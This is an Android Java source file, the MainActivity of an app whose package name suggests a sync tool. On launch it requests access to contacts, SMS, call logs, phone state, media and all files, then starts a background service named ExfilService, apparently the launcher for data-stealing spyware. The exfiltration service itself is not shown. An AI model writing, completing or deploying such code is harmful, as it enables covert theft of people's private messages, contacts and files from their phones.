package com.sync.core;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ = 0x4A;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.READ_PHONE_STATE);

        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        List<String> needed = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                needed.toArray(new String[0]), REQ);
        }

        if (Build.VERSION.SDK_INT >= 30
                && !Environment.isExternalStorageManager()) {
            Intent i = new Intent(
                Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        }

        Intent svc = new Intent(this, ExfilService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
    }
}
